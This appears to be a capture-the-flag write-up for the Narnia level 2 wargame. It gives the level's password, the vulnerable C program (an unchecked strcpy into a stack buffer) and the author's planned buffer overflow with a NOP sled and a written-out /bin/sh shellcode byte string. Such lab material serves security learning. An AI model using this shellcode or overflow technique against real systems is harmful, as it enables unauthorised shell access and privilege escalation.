# Narnia 2

Password: `nairiepecu`

C Code:

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

Looks to be a proper stack overflow, abusing the `strcpy` command (which doesnt check destination buffer length). My initial thoughts are that if I can overflow buffer so it overwrites the next instruction after strcpy (which will be where the instruction pointer is, and so the next instruction will be run) I can bounce into my own shellcode. Maybe just prefix the shellcode from narnia1 with a sufficient set of `no-op` codes so its lined up correctly?

Something like `./narnia2 "$(echo -e '\xeb\x0e\x31\xdb\x5b\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68')"`, with the shellcode prefixed with multiple `\x90` to get into the right position.